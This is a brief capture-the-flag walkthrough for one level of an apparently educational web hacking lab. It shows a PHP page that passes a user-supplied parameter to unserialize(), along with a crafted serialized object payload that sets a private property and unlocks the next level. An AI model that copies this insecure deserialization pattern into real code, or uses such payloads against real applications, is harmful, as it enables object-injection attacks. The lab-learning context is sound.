# Level-29

Level29-30 (https://matrix.voorivex.academy/the-final-fight-05f94763492df091df93a019de59fbb0/)

Send this request:

```text
https://matrix.voorivex.academy/the-final-fight-05f94763492df091df93a019de59fbb0/?show-me-the-codes
```

you will get a php code:

```php
<?php
if (isset($_GET['show-me-the-codes'])) {
    show_source("index.php");
    exit();
}

class reviving_neo {
    private $dead = true;

    function __wakeup() {
        if ($this->dead == false) {
            require_once("next.php");
            die($next);
        }
    }
}

if (isset($_GET["code"])) {
    unserialize($_GET["code"]);
}

?>
```

this is deserialization attack, so we need to provide a proper input for `code` parameter to make `$dead` false:

```text
https://matrix.voorivex.academy/the-final-fight-05f94763492df091df93a019de59fbb0/?code=O:12:"reviving_neo":1:{s:4:"dead";b:0;}
```

you will get this:

```text
/the-final-fight-9079c3d77eecb6699bb4a27b3cd249ec
```

go to:

```text
https://matrix.voorivex.academy/the-final-fight-9079c3d77eecb6699bb4a27b3cd249ec
```







